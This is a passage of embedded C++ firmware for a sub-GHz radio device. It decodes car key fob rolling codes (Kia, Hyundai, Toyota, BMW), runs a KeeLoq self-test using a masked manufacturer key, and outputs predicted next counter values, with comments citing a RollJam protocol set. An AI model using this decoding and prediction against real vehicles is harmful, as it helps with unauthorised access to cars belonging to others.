static uint32_t KIA34_LAST_SN  = 0;
static uint32_t KIA34_LAST_HOP = 0;
static bool     KIA34_HAVE_LAST = false;

// Returns true when this (serial,hop) is a second, distinct press of a fob we
// already saw. Always records the frame.
static bool ks_kiaV34Confirm(uint32_t serial,uint32_t hop){
  bool agree = KIA34_HAVE_LAST && (serial==KIA34_LAST_SN) && (hop!=KIA34_LAST_HOP);
  KIA34_LAST_SN=serial; KIA34_LAST_HOP=hop; KIA34_HAVE_LAST=true;
  return agree;
}

// PWM pulse array -> bit string, starting the search at `off`.
//
// This follows the reference decoder's model exactly, which differs from a naive
// pulse-pair reading in two ways that both matter on real captures:
//
//  1. ONE BIT PER HIGH PULSE, not per pair. The reference adds a bit only in its
//     `if(level)` branch — a HIGH pulse of te_short width is a 0, te_long is a 1;
//     LOW pulses contribute nothing. Reading pairs (S,L)->1 / (L,S)->0 happens to
//     recover the same serial on a clean V4 capture, which is why this went
//     unnoticed, but it gets the V3/V4 version wrong.
//
//  2. A SYNC PULSE (1000-1500 us) separates the preamble from the data, and its
//     LEVEL is the version. Sync HIGH => V4 (no inversion); sync LOW => V3 (invert
//     all bytes). The reference calls this `is_v3_sync`. Pairing straight through
//     the sync cannot cross it, so a pair reader never reaches the data at all.
//
// The pulse array holds unsigned widths, so the level is recovered from index
// parity: the capture path starts at a HIGH pulse, so indices with
// (i%2)==parityHigh are HIGH. Both phases are tried at the caller, because a
// dropped narrow pulse in the capture path can shift parity.
//
// Returns the bit count, or 0 when fewer than KIA_V34_MIN_BITS. Sets *outV3 from
// the sync level. `bits` must hold at least CAP_SZ/2+1 bytes.
static bool ks_kiaV34IsSync(uint32_t v){
  return v>1000 && v<1500;
}

static uint16_t ks_kiaV34PwmAt(const uint32_t* buf,int n,int off,int parityHigh,
                               char* bits,bool* outV3){
  int i=off;
  // Preamble: a run of short+short pairs. The reference requires >=8.
  int hdr=0;
  while(i+1<n && ks_kiaV34IsPulse(buf[i],KIA_V34_TE_SHORT)
                && ks_kiaV34IsPulse(buf[i+1],KIA_V34_TE_SHORT)){ hdr++; i+=2; }
  if(hdr<8) return 0;

  // Skip any residual preamble pulses to reach the sync.
  int j=i;
  while(j<n && !ks_kiaV34IsSync(buf[j])){
    if(!ks_kiaV34IsPulse(buf[j],KIA_V34_TE_SHORT)) return 0;
    j++;
  }
  if(j>=n) return 0;

  // The sync's level selects the interpretation. This is the reference's
  // is_v3_sync: a LOW sync means V3, which inverts the frame.
  bool syncHigh = ((j%2)==parityHigh);
  *outV3 = !syncHigh;

  // Data begins immediately after the sync: one bit per HIGH pulse.
  uint16_t b=0;
  for(int k=j+1; k<n && b<CAP_SZ/2; k++){
    uint32_t w=buf[k];
    if(ks_kiaV34IsSync(w)) break;                    // next sync/frame boundary
    if(((k%2)==parityHigh)){                         // HIGH pulse -> contributes a bit
      if(ks_kiaV34IsPulse(w,KIA_V34_TE_SHORT))      bits[b++]='0';
      else if(ks_kiaV34IsPulse(w,KIA_V34_TE_LONG)) bits[b++]='1';
      else break;
    }
    if(b>=KIA_V34_MIN_BITS+16) break;
  }
  bits[b]=0;
  return (b>=KIA_V34_MIN_BITS)?b:0;
}

// Scan the capture for a preamble, returning the first bit string that reaches
// KIA_V34_MIN_BITS. Both index parities are tried, since the capture path can drop
// a narrow pulse and shift which indices are HIGH.
//
// The scan stops at the FIRST offset that yields a full frame, so a capture costs
// one field-extraction and one decrypt attempt per (parity) path, not one per
// offset. Trying every offset would multiply the chances against a 12-bit check.
static uint16_t ks_kiaV34Pwm(const uint32_t* buf,int n,char* bits,bool* outV3){
  for(int off=0; off+2*KIA_V34_MIN_BITS<=n; off++){
    for(int ph=0; ph<2; ph++){
      bool v3=false;
      uint16_t nb=ks_kiaV34PwmAt(buf,n,off,ph,bits,&v3);
      if(nb){ *outV3=v3; return nb; }
    }
  }
  return 0;
}

// Bit string -> 9 payload bytes, big-endian bit order (byte n/8, bit 7-(n%8)).
static void ks_kiaV34BitsToBytes(const char* bits,int nb,uint8_t out[9]){
  for(int i=0;i<9;i++) out[i]=0;
  int lim = nb < 72 ? nb : 72;
  for(int i=0;i<lim;i++){
    if(bits[i]=='1') out[i/8] |= (uint8_t)(1u << (7-(i%8)));
  }
}

// Full decoder: pulse array -> validated frame.
//
// Version comes from the sync pulse's level (V3 = low = inverted, V4 = high), as
// the reference does with is_v3_sync. Both interpretations are still attempted,
// because if the sync-derived guess is wrong the other one may still validate —
// but the sync decides which is tried first and which is reported, so `out.v3`
// reflects the frame's actual polarity rather than a guess.
static bool ks_decodeKiaV34(const uint32_t* buf,int cnt,KiaV34Frame& out){
  static char bits[CAP_SZ/2+1];
  bool v3Hint=false;
  uint16_t nb = ks_kiaV34Pwm(buf,cnt,bits,&v3Hint);
  if(!nb) return false;
  uint8_t b[9];
  ks_kiaV34BitsToBytes(bits,nb,b);
  // Try the sync-derived interpretation first, then the other.
  for(int pass=0;pass<2;pass++){
    bool invert = (pass==0) ? v3Hint : !v3Hint;
    KiaV34Frame f;
    ks_kiaV34Extract(b,b[8],invert,f);
    f.v3=invert;
    if(ks_kiaV34Validate(f)){ out=f; return true; }
  }
  return false;
}

// ─── A1: Kia V3/V4 synthetic round-trip ─────────────────────────────────────
// The acceptance test that needs no radio. Builds a frame exactly as the
// reference encoder does, turns it into a PWM pulse array in the REAL on-air
// format, runs the shipped decoder over it, and requires serial/button/counter
// back. Runs for both V3 and V4.
//
// The on-air format matters and was wrong in the first version of this test. A
// real frame is:
//     [ ~12 short+short preamble pairs ][ SYNC 1000-1500us ][ 68 data bits ]
// where each data bit is one HIGH pulse (te_short -> 0, te_long -> 1) followed by
// a LOW pulse that carries nothing. The SYNC's level sets the version: sync HIGH
// -> V4 (no inversion), sync LOW -> V3 (whole frame inverted).
//
// The earlier version generated (short,long)->1 pulse PAIRS with no sync. That is
// not the format, and it made A1 pass against an extractor that also used pairs --
// a self-consistent pair of errors. A2 against real captures is what exposed it.
//
// Reference encoder (lib/subghz/protocols/kia_v3_v4.c):
//   plaintext = (cnt & 0xFFFF) | ((serial & 0x3FF) << 16) | ((btn & 0x0F) << 28)
//   encrypted = keeloq_encrypt(plaintext, KIA_MF_KEY)
//   raw[0..3] = rev8(byte n of encrypted)
//   raw[4..7] = rev8(byte n of (serial & 0x0FFFFFFF) | (btn << 28))
static bool kiaV34SelfTestOK = false;

// Build the pulse array a real transmitter emits for one Kia V3/V4 frame.
//   HIGH pulses at even indices (parityHigh=0), since the array starts at HIGH.
//   returns pulse count, or 0 on overflow.
static int ks_kiaV34BuildPulses(uint32_t* pw,int cap,const char* bits,int nbits,bool v3){
  int n=0;
  // Preamble: 12 short+short pairs.
  for(int i=0;i<12 && n+1<cap;i++){ pw[n++]=KIA_V34_TE_SHORT; pw[n++]=KIA_V34_TE_SHORT; }
  // Sync. Level is the version: V3 -> LOW, V4 -> HIGH.
  // A HIGH pulse occupies an even index; a LOW pulse an odd index. Emit a filler
  // pulse first when needed so the sync lands on the right parity.
  if(v3){
    // want sync LOW (odd index). Emit one HIGH filler to shift parity.
    if(n+2<cap){ pw[n++]=KIA_V34_TE_SHORT; pw[n++]=1188; }
    else return 0;
  } else {
    // want sync HIGH (even index)
    if(n+1<cap){ pw[n++]=1188; pw[n++]=KIA_V34_TE_SHORT; }
    else return 0;
  }
  // Data: one bit per HIGH pulse, each HIGH followed by a LOW.
  for(int i=0;i<nbits && n+1<cap;i++){
    uint32_t hi = (bits[i]=='1') ? KIA_V34_TE_LONG : KIA_V34_TE_SHORT;
    pw[n++]=hi;            // HIGH -> carries the bit
    pw[n++]=KIA_V34_TE_SHORT;   // LOW -> carries nothing
  }
  return n;
}

static bool ks_kiaV34SelfTest(){
  const uint32_t serial = 0x0A1B2CE7UL;   // LSB 0xE7 — exercises the 8-bit check
  const uint8_t  btn    = 0x3;
  const uint16_t ctr    = 0x4D2;

  uint32_t pt  = ks_kiaV34BuildPlain(btn, serial, ctr);
  uint32_t enc = ks_klEncrypt(pt, ks_unmaskMfrKey(KIA_V34_MF_KEY));

  uint8_t raw[8];
  raw[0] = ks_kiaV34Rev8((uint8_t)(enc & 0xFF));
  raw[1] = ks_kiaV34Rev8((uint8_t)((enc >>  8) & 0xFF));
  raw[2] = ks_kiaV34Rev8((uint8_t)((enc >> 16) & 0xFF));
  raw[3] = ks_kiaV34Rev8((uint8_t)((enc >> 24) & 0xFF));
  // Bytes 4..7 carry the ON-AIR form: full 28-bit serial + button nibble. This is
  // a different layout from the encrypted word above.
  uint32_t serial_btn = (serial & 0x0FFFFFFFUL) | ((uint32_t)(btn & 0x0F) << 28);
  raw[4] = ks_kiaV34Rev8((uint8_t)(serial_btn & 0xFF));
  raw[5] = ks_kiaV34Rev8((uint8_t)((serial_btn >>  8) & 0xFF));
  raw[6] = ks_kiaV34Rev8((uint8_t)((serial_btn >> 16) & 0xFF));
  raw[7] = ks_kiaV34Rev8((uint8_t)((serial_btn >> 24) & 0xFF));

  uint8_t pass = 0;
  for(int v3=0; v3<2; v3++){
    uint8_t payload[9];
    for(int i=0;i<8;i++) payload[i] = v3 ? (uint8_t)~raw[i] : raw[i];
    payload[8] = v3 ? (uint8_t)~0x00 : 0x00;   // CRC nibble 0; not validated

    // 68 data bits: 64 payload + 4 CRC. Big-endian within bytes, matching
    // ks_kiaV34BitsToBytes.
    char bits[80];
    int k=0;
    for(int i=0;i<72;i++) bits[k++] = ((payload[i/8] >> (7-(i%8))) & 1) ? '1' : '0';
    bits[k]=0;

    static uint32_t pw[512];
    int n = ks_kiaV34BuildPulses(pw,512,bits,68,v3!=0);
    if(!n){ Serial.printf("[KIA] A1 FAULT %s: pulse build overflow\n", v3?"V3":"V4"); continue; }

    KiaV34Frame out;
    if(!ks_decodeKiaV34(pw,n,out)){
      Serial.printf("[KIA] A1 FAULT %s: synthetic frame did not decode\n", v3?"V3":"V4");
      continue;
    }
    bool ok = (out.serial==serial) && (out.btn==btn) && (out.ctr==ctr) && (out.v3==(v3!=0));
    if(!ok){
      Serial.printf("[KIA] A1 FAULT %s: serial=0x%08lX want 0x%08lX | btn=%X want %X | ctr=0x%04X want 0x%04X | version=%s\n",
                    v3?"V3":"V4", (unsigned long)out.serial, (unsigned long)serial,
                    out.btn, btn, out.ctr, ctr, out.v3?"V3":"V4");
      continue;
    }
    pass++;
  }

  kiaV34SelfTestOK = (pass==2);
  if(kiaV34SelfTestOK) Serial.println("[KIA] A1 selftest pass (2/2: V3 and V4, on-air format)");
  else                 Serial.printf("[KIA] A1 selftest FAIL (%u/2) - Kia V3/V4 framing is broken\n",(unsigned)pass);

  // Known-answer tests for the ENCRYPTION plaintext layout. The round-trip above
  // is self-consistent and therefore BLIND to the layout: the 12-bit check reads
  // only serial[7:0], which every candidate layout places at bits[23:16]. Two
  // vectors are required — vector 1 has serial[9:8]=0 so it cannot distinguish the
  // 10-bit mask from an 8-bit one; vector 2 does.
  //   vector 1  serial=0x0A1B2CE7 -> pt=0x30E704D2  enc=0x8686900B
  //   vector 2  serial=0x0A1B2FE7 -> pt=0x33E704D2  enc=0x10944604
  {
    struct { uint32_t serial, pt, enc; uint8_t btn; uint16_t ctr; } kt[2] = {
      { 0x0A1B2CE7UL, 0x30E704D2UL, 0x8686900BUL, 0x3, 0x4D2 },
      { 0x0A1B2FE7UL, 0x33E704D2UL, 0x10944604UL, 0x3, 0x4D2 },
    };
    for(int i=0;i<2;i++){
      uint32_t gotPt  = ks_kiaV34BuildPlain(kt[i].btn, kt[i].serial, kt[i].ctr);
      uint32_t gotEnc = ks_klEncrypt(gotPt, ks_unmaskMfrKey(KIA_V34_MF_KEY));
      if(gotPt != kt[i].pt){
        Serial.printf("[KIA] A1 KAT%d FAULT: plaintext=0x%08lX want 0x%08lX (serial/button layout wrong)\n",
                      i+1,(unsigned long)gotPt,(unsigned long)kt[i].pt);
        kiaV34SelfTestOK = false;
      } else if(gotEnc != kt[i].enc){
        Serial.printf("[KIA] A1 KAT%d FAULT: encrypt=0x%08lX want 0x%08lX\n",
                      i+1,(unsigned long)gotEnc,(unsigned long)kt[i].enc);
        kiaV34SelfTestOK = false;
      }
    }
  }

  if(kiaV34SelfTestOK) Serial.println("[KIA] A1 KAT pass (2 vectors, incl. mask-width pin)");
  return kiaV34SelfTestOK;
}


// ─── KIA/HYU V2 — 53-bit OOK Manchester rolling code (EU/433 MHz) ────────────
// TE_short=500µs, TE_long=1000µs. Preamble: ≥100 SHORT+SHORT pairs, 433 MHz.
// Frame (53-bit MSB-first, Manchester-decoded; bit[52]=start=1):
//   [52]=start  [51:20]=serial(32)  [19:16]=button(4)
//   [15:4]=raw_count(12)            [3:0]=CRC4 (nibble-XOR of bits[51:4])
// Counter unscramble: cnt = ((rc>>4)|(rc<<8))&0xFFF  (12-bit rotate-right-4)
static bool ks_decodeKiaV2(const char* mb,int ml,
    uint32_t& serial,uint16_t& ctr,uint8_t& btn,bool& valid){
  if(ml<53) return false;
  for(int s=0;s+53<=ml;s++){
    if(mb[s]!='1') continue;
    uint64_t data=0;
    for(int i=0;i<53;i++) if(mb[s+i]=='1') data|=(uint64_t)1<<(52-i);
    uint32_t sn=(uint32_t)((data>>20)&0xFFFFFFFFUL);
    uint8_t  bn=(uint8_t)((data>>16)&0x0F);
    uint16_t rc=(uint16_t)((data>>4)&0xFFF);
    uint8_t  rxc=(uint8_t)(data&0x0F);
    if(sn==0||sn==0xFFFFFFFFUL||bn==0) continue;
    // CRC4 over the twelve data nibbles, plus one. The +1 is part of the formula, and its
    // absence was a real defect rather than a tolerant threshold: verified against the two
    // genuine KIA/HYU V2 key files in the corpus (Hyundai_V2_N1, Hyundai_V2_Random_Habar),
    // which pass ONLY with the +1, and against the seven Tesla 433.92 MHz captures this
    // decoder used to fire on, which pass only WITHOUT it. The two sets are disjoint, so
    // this single operator both validates real frames and removes the false positives.
    // Ref: kia_v2.c in the RollJam protocol set of Flipper-ARF, which computes
    // (crc + 1) & 0x0F. See CITATIONS_AND_REFERENCES.md item 14 and research/39.
    uint8_t calc=0;
    for(int n=1;n<=12;n++) calc^=(uint8_t)((data>>(n*4))&0x0F);
    if(((calc+1)&0x0F)!=rxc) continue;
    serial=sn; ctr=((rc>>4)|(uint16_t)(rc<<8))&0xFFF; btn=bn; valid=true;
    return true;
  }
  return false;
}

// Toyota/Denso RKE (2002-2020) — 40-bit OOK PWM rolling code
// Camry/Corolla/RAV4/Tacoma/Tundra/Highlander/Yaris/Prius/Land Cruiser/Hilux/Lexus IS/ES/RX
// Frequencies: 314.35/315 MHz (North America), 433.92 MHz (Europe/Japan)
// TE ≈ 390-420 µs (NA) or 350-390 µs (EU/JP)
// Preamble: short on modern fobs, measured at 3-11 pairs across the corpus; the decoder
//   requires 8. Only 2 of 64 Toyota/Lexus captures reach 8 pairs, and those are the only
//   two it can currently resolve at all -- the rest fail at the data stage.
// Sync (optional): ≈1 TE HI + 7-22 TE LO — absorbed if present, skipped if absent.
//   At 433 MHz the sync gap (≈13*360=4680 µs) falls below the 5000 µs k-means clip
//   threshold and corrupts the ratio estimate. This decoder re-measures TE directly
//   from the preamble pulses so it is immune to k-means ratio corruption.
// Bit: 1 = 2TE HI + 1TE LO, 0 = 1TE HI + 2TE LO (MSB-first)
// Frame: [serial 24-bit][button 4-bit][counter 12-bit]
// Ref: Denso KeeLoq variant
static bool ks_decodeToyota(const uint32_t* buf,int cnt,uint32_t& serial,uint8_t& btn,uint16_t& ctr){
  // Pre-filter: replace any pulse > 5000 µs with the preceding value before the
  // preamble search.  Capture artefacts (RFI spikes, end-of-buffer garbage written
  // by DMA fill) that exceed 5000 µs cannot be valid Toyota pulses — the widest
  // legitimate value is the 28 000 µs sync-gap upper bound, but that always lands
  // at an ODD (LO) position and is never directly read by the HI-only data loop.
  // When such a spike lands at an EVEN (HI) position in the data loop it fails
  // both the 1T and 2T HI checks and sets ok=false, aborting an otherwise-valid
  // decode.  5000 µs matches the k-means outlier threshold so the two filters
  // are consistent.  Long sync gaps (e.g. GQ4-52T ~9-15 ms) land at ODD (LO)
  // positions and are preserved intact by this even-position-only failure mode
  // avoidance.
  static uint32_t cbuf[CAP_SZ];
  int ccnt=(cnt<=CAP_SZ)?cnt:CAP_SZ;
  cbuf[0]=buf[0];
  for(int i=1;i<ccnt;i++) cbuf[i]=(buf[i]<=5000)?buf[i]:cbuf[i-1];
  for(int pi=0;pi+79<ccnt;pi++){
    uint32_t te0=cbuf[pi];
    // TE range: 150–700 µs.  Older Denso/Lexus remotes use TE≈400 µs; Toyota 2018+
    // (GQ4-52T and similar) use TE≈200 µs.  The lower bound was raised to 250 µs in
    // v3.18 which silently excluded all 200 µs fobs — lowering it back to 150 µs
    // recovers those captures.  Upper limit raised from 560 → 700 µs to accommodate
    // slower Denso variants (some Land Cruiser / early Lexus remotes, TE≈600–650 µs).
    if(te0<150||te0>700) continue;
    // Count preamble pairs: HI within ±35%, LO within ±50% of te0.
    // The CC1101 in RSSI mode has a slow falling-edge response — the LOW period
    // of each preamble pair reads ~15-25% longer than the actual TE due to RSSI
    // averaging lag after carrier turns off.  Widening the LO tolerance to ±50%
    // handles this without inflating the TE estimate (TE is derived from HI only).
    int pc=0; int j=pi; uint64_t teAcc=0;
    while(j+1<ccnt&&ks_inR(cbuf[j],te0,35)&&ks_inR(cbuf[j+1],te0,50)){
      teAcc+=cbuf[j]; pc++; j+=2;    // HI pulses only — LO is RSSI-lag inflated
    }
    // Require >=8 preamble pairs. The header always documented 8, but the code required 3
    // with a note claiming 3 "prevents false positives"; measured, it does the opposite,
    // admitting captures the foreign aliases satisfy. On the full corpus, 8 keeps the
    // identical own-brand result (the same 2 Camry captures decode) while cutting the
    // foreign hits from 8 to 5.
    //
    // The trade-off to state plainly: only 2 of 64 Toyota/Lexus captures have >=8
    // detectable pairs, because a modern fob's preamble is short (Corolla 5, Tundra 11)
    // and those captures fail later, at the data stage. So 8 does not exclude them for a
    // reason of its own, but it would exclude them if that data stage were ever repaired.
    // The two Camry files that do decode are the only ones this decoder can currently
    // handle at all, so 8 is not losing working coverage today.
    if(pc<8) continue;
    uint32_t te=(uint32_t)(teAcc/(uint64_t)pc);   // TE from HI-pulse average only
    // Sync gap: ≈1×TE HI followed by a long LO (carrier off) that separates the
    // preamble from the data frame.  Range is [3×TE … 28 000 µs].
    //   Lower bound (te*3): longer than any data LO (max 2×TE) so we can't confuse
    //     the gap with a '0' bit's LO.
    //   Upper bound (28 000 µs): just below the 30 ms capture-gap termination so we
    //     never consume a real end-of-burst silence as a sync gap.
    //   OLD bounds were te*7 … te*22 (2.8–8.8 ms for TE=400 µs).  GQ4-52T and many
    //   2018+ remotes have a 9–15 ms sync gap, which is > te*22 → sync was never
    //   detected → ds=j → the first data-bit LO was the long gap → is0/is1 both
    //   failed → ok=false → OOK-raw on every press.
    // Note: long sync gaps (e.g. 9 ms for GQ4-52T) are NOT replaced by the pre-filter
    // above because the pre-filter only replaces HI positions (even indexes off ds)
    // when a spike is present; the sync gap always appears as a LO (odd position)
    // after the sync-HI at j, so buf[j+1] retains its original value here.
    int ds=j;
    if(j+1<ccnt&&ks_inR(cbuf[j],te,35)&&cbuf[j+1]>=te*3&&cbuf[j+1]<=28000UL) ds=j+2;
    if(ds+79>ccnt) continue;
    // Phase-retry + end-of-capture tolerance:
    //
    // Problem 1 — phase misalignment.  The CC1101 RSSI capture can trigger on
    // either a HI or LO edge, so the first pulse in the buffer is not guaranteed
    // to be a carrier-ON (HI) period.  When the preamble search starts at an odd
    // buffer index (LO position) j ends up odd too, and the data loop reads LO
    // pulses where it expects HI pulses.  A 3T LO gap between two '0'-bit low
    // periods then appears at an even (HI) slot and exceeds both the 1T and 2T
    // windows → ok=false.  Evidence: Lexus LS300 at 314.65 MHz — preamble found
    // at index 31 (LO), j=37, ds=37, decode fails at b=14 on a 841 µs pulse
    // that was actually a LO gap.
    //
    // Problem 2 — end-of-capture artifact.  With correct phase (ds=38) bits 0-38
    // decode cleanly, but b=39 reads a 1185 µs pulse at the very end of the buffer
    // (index 116 out of 119) — end-of-burst RSSI tail artifact that exceeds 2T.
    //
    // Fix: try ds first, then ds+1 (one-pulse phase shift) if ds fails; within
    // each attempt accept the decode if only the last 1-2 bits (b≥38) are bad,
    // treating them as 0 (end-of-capture noise cannot flip a known rolling code).
    // The serial≠0 and entropy checks that follow still guard against false decodes.
    uint64_t word=0; bool ok=false;
    for(int dsTry=ds; dsTry<=ds+1 && !ok; dsTry++){
      if(dsTry+79>ccnt) break;
      word=0; bool ok2=true;
      for(int b=0;b<40;b++){
        uint32_t hi=cbuf[dsTry+b*2];
        // Bit classification by HI pulse ONLY (LO check dropped — RSSI lag inflates
        // carrier-OFF periods 50–150% at typical distances; HI alone cleanly
        // discriminates 1T from 2T within ±35%).  is1 checked first so a borderline
        // pulse cannot satisfy both.
        bool is1=ks_inR(hi,2*te,35);
        bool is0=(!is1)&&ks_inR(hi,te,35);
        if(is1)      word=(word<<1)|1ULL;
        else if(is0) word<<=1;
        else{ ok2=(b>=38); word<<=1; break; }  // last 1-2 bits: treat as 0 (end-of-capture noise)
      }
      if(ok2) ok=true;
    }
    if(!ok) continue;
    serial=(uint32_t)((word>>16)&0xFFFFFFUL);
    btn   =(uint8_t) ((word>>12)&0xFU);
    ctr   =(uint16_t)(word      &0xFFFU);
    if(serial==0||serial==0xFFFFFFUL) continue;
    // Entropy gate: real Toyota rolling codes are pseudo-random; typical
    // transition count across 39 bit-pairs is ~20 (50%).  Preamble-only
    // captures and degenerate noise produce flat or fully-alternating patterns.
    // Bounds 8–32 (20–82%) reject those while passing all real fob serials.
    {int tr=0;for(int i=0;i<39;i++) if(((word>>i)&1)!=((word>>(i+1))&1)) tr++;
    if(tr<8||tr>32) continue;}
    return true;
  }
  return false;
}

// BMW CAS4 / VW Touareg — 64-bit Manchester, te≈500µs
// Frame markers (BMW CAS4 framing): byte[0]==0x30, byte[6]==0xC5
static bool ks_decodeBMWCAS4(const char* mb,int ml,uint64_t& frame){
  if(ml<64) return false;
  for(int off=0;off+64<=ml;off++){
    uint8_t b[8]={0};
    for(int i=0;i<64;i++) if(mb[off+i]=='1') b[i/8]|=(uint8_t)(1u<<(7-(i%8)));
    if(b[0]==0x30u&&b[6]==0xC5u){
      frame=0; for(int i=0;i<8;i++) frame=(frame<<8)|b[i];
      return true;
    }
  }
  return false;
}

// ─── Main Decode Orchestrator ─────────────────────────────────────────────────
String decodeSignal(){
  if(rfLen<18){ lastDecode="{\"error\":\"no-signal\",\"edges\":"+String(rfLen)+"}"; return lastDecode; }

  // ── buf / kbuf are static (research/28 §3.1) ─────────────────────────────────
  //
  // These were two uint32_t[CAP_SZ] arrays on the stack: 2048 B each, 4 KB together, against
  // an 8 KB loopTask stack. With the JsonDocument, ~30 sequential decoder calls and ArduinoJson
  // String temporaries on top, the first REAL frame tripped the stack canary:
  //
  //   Stack canary watchpoint triggered (loopTask)
  //   loop() -> handleSerial() -> fbkImportFrame() -> decodeSignal() -> ArduinoJson operator=<String>
  //
  // This follows the v3.41 precedent for exactly this class of defect -- large per-call stack
  // arrays moved to BSS:
  //   · MfrKey derived[MAX_DERIVED_KEYS] (4.8 kB/call) -> static
  //   · uint16_t rawBuf[CAP_SZ] in captureSignal       -> static (1 kB freed)
  //   · uint32_t tmp[CAP_SZ]    in captureSignal       -> static (2 kB freed)
  //
  // Safe because decodeSignal() runs only on the single Arduino loop task, and cannot
  // re-enter: verified, there is no xTaskCreate/xTaskCreateUniversal/TaskHandle_t anywhere in
  // this sketch, and no call to decodeSignal() from within its own body. All 8 call sites are
  // sequential on that one task, and each call refills buf from rfBuf at entry, so a successive
  // call cannot observe a previous call's remnants.
  //
  // Net effect: 4 KB of stack demand removed at ANY stack size, which is what makes the
  // remaining loopTask size a number to measure rather than a guess to raise.
  static uint32_t buf[CAP_SZ]; int cnt=rfLen;
  for(int i=0;i<cnt;i++) buf[i]=rfBuf[i];
  float mhz=(rfFreq>100.f)?rfFreq:433.92f;
  uint32_t nowMs=millis();

  // Run k-means on a pulse-clipped copy to prevent inter-frame pauses from
  // corrupting cluster centroids. KeeLoq's longest data pulse is 2×TE ≤ 1500µs;
  // any captured pulse > 5000µs is an inter-frame gap (some fobs have gaps < 30ms
  // which survive the gap-termination threshold and land in rfBuf). A single such
  // pause makes cB ≈ 20000 and ratio ≈ 100 → te_kl = false before decode starts.
  uint32_t cA=0,cB=0;
  bool km;
  { static uint32_t kbuf[CAP_SZ]; int kn=0;
    for(int i=0;i<cnt;i++) if(buf[i]<=5000) kbuf[kn++]=buf[i];
    km = ks_km2(kn>=6 ? kbuf : buf, kn>=6 ? kn : cnt, cA, cB); }

  JsonDocument doc;
  doc["freq"]=String(mhz,2); doc["f"]=String(mhz,2);
  doc["edges"]=cnt; doc["pulses"]=cnt;
  doc["rssi"]=rfRssi; doc["te_us"]=cA; doc["te_stddev"]=(int)ks_teStddev(buf,cnt,cA);

  // ── Toyota-band k-means bypass ───────────────────────────────────────────────
  // Toyota/Denso preamble is all equal-width pulses (≈1T HI + 1T LO) which
  // collapse k-means to a single cluster → km=false.  The Toyota decoder
  // measures TE directly from the preamble and does NOT need k-means, so it
  // must be attempted BEFORE the OOK-raw bail-out below.
  // Frequency guard (311.5–315.5 MHz) prevents false positives on other bands.
  if(!km && mhz>=311.5f && mhz<=315.5f){
    uint32_t tsn=0; uint8_t tbtn=0; uint16_t tctr=0;
    bool tA=(mhz>=311.5f&&mhz<=313.5f);
    if(ks_decodeToyota(buf,cnt,tsn,tbtn,tctr)){
      char fh[10]; snprintf(fh,10,"0x%06lX",(unsigned long)tsn);
      doc["proto"]="Toyota-Denso"; doc["valid"]=true;
      doc["sn"]=fh; doc["btn"]=tbtn; doc["ctr"]=tctr;
      doc["channel"]=tA?"A":"B";
      doc["mfr"]="Toyota/Lexus (Denso)";
      doc["note"]="OOK PWM rolling code (k-means bypass — equal preamble)";
      HistEntry he={tsn,0,(uint32_t)tctr,28,mhz,nowMs}; ks_hPush(he);
      int32_t d=ks_estDelta(tsn,28,(uint32_t)tctr);
      JsonObject p=doc["predict"].to<JsonObject>();
      p["delta"]=d; p["next_ctr"]=(uint16_t)((tctr+(uint16_t)d)&0xFFFU);
      p["window"]=4096; p["note"]="Toyota/Denso proprietary rolling code — cipher not public";
      serializeJson(doc,lastDecode); return lastDecode;
    }
    // Soft-ID covers BOTH Channel A (~312 MHz) and Channel B (~314-315 MHz).
    // The km=false gate already proves this is an equal-preamble (single-cluster)
    // signal.  Security+ has two distinct pulse lengths → always km=true, so the
    // Ch-B / Security+ overlap that prevents soft-ID in the km=true path (line 1j)
    // does NOT apply here.  Any km=false signal in the Toyota dual-band range is
    // safely committed as Toyota-Denso heuristic.
    //
    // Confidence levels:
    //   "too_short"   — cnt<80 so the decoder loop (pi+79<cnt) never executed.
    //                   User should press the fob closer or verify RSSI.
    //   "distorted_te"— decoder ran but TE scatter caused all bit checks to fail.
    //                   Almost always RSSI-mode timing lag; GDO0 fix resolves this.
    //   "heuristic"   — decoder ran, TE plausible, but no valid serial extracted
    //                   (entropy gate or sync-gap mismatch); freq match is the only
    //                   identification evidence.
    {
      doc["proto"]="Toyota-Denso"; doc["valid"]=false;
      doc["sn"]="0x000000"; doc["btn"]=0; doc["ctr"]=0;
      doc["channel"]=tA?"A":"B"; doc["mfr"]="Toyota/Lexus (Denso)";
      doc["confirmed"]=false;
      if(cnt < 80){
        // Decoder loop requires pi+79<cnt; with cnt<80 it never executes.
        doc["confidence"]="too_short";
        JsonObject p=doc["predict"].to<JsonObject>();
        p["window"]=0;
        p["note"]="Toyota/Denso — only "+String(cnt)+" edges captured; need 80+ for full frame decode (press fob closer)";
      } else {
        // Decoder ran but failed — most likely RSSI-mode TE distortion.
        doc["confidence"]="heuristic";
        JsonObject p=doc["predict"].to<JsonObject>();
        p["window"]=0;
        p["note"]="Toyota/Denso — equal-preamble (km-bypass); "+String(cnt)+" edges, TE distortion likely (RSSI mode)";
      }
      serializeJson(doc,lastDecode); return lastDecode;
    }
  }
  if(!km){
    uint32_t s32[32]; uint8_t ns=cnt<32?cnt:32;
    memcpy(s32,buf,ns*sizeof(uint32_t));
    for(uint8_t i=1;i<ns;i++){uint32_t k=s32[i];int8_t j=i-1;while(j>=0&&s32[j]>k){s32[j+1]=s32[j];j--;}s32[j+1]=k;}
    doc["proto"]="OOK-raw"; doc["bits"]=""; doc["valid"]=false; doc["mfr"]="";
    // Diagnostic fields so the dashboard/serial shows what was captured even without decode.
    doc["rflen"]=rfLen; doc["cap_mode"]=lastCapGdo0?"gdo0":"rssi"; doc["te_b"]=0; doc["blen"]=0;
    { JsonArray pArr=doc["pulse_us"].to<JsonArray>();
      int pN=(cnt<200)?cnt:200;
      for(int pi=0;pi<pN;pi++) pArr.add(buf[pi]); }
    { // Serial log: first 10 pulse widths so USB-serial users can share raw data
      String pl="  OOK-raw("+String(cnt)+"): ";
      for(int i=0;i<(cnt<10?cnt:10);i++){pl+=String(buf[i]);if(i<cnt-1)pl+=",";}
      addLog(pl); }
    serializeJson(doc,lastDecode); return lastDecode;
  }

  uint32_t thr=(cA+cB)/2;
  static char bits[CAP_SZ+1];
  uint16_t bLen=ks_mkBits(buf,cnt,bits,thr);
  float ratio=(cA>0)?(float)cB/(float)cA:0.f;
  // Bound the encoded length to what the buffer can hold. bLen can legitimately reach
  // CAP_SZ, which would need 129 bytes; this keeps the write inside hexbuf (the
  // overflow described at ks_hexStr). The full-length bit string is still available
  // separately via doc["bits"], so nothing is lost by truncating the hex form.
  char hexbuf[128]={0};
  int hexLen=(bLen>508)?508:bLen;
  ks_hexStr(bits,hexLen,hexbuf,sizeof(hexbuf));
  doc["hex"]=hexbuf; doc["bits"]=hexbuf; doc["ratio"]=String(ratio,2);

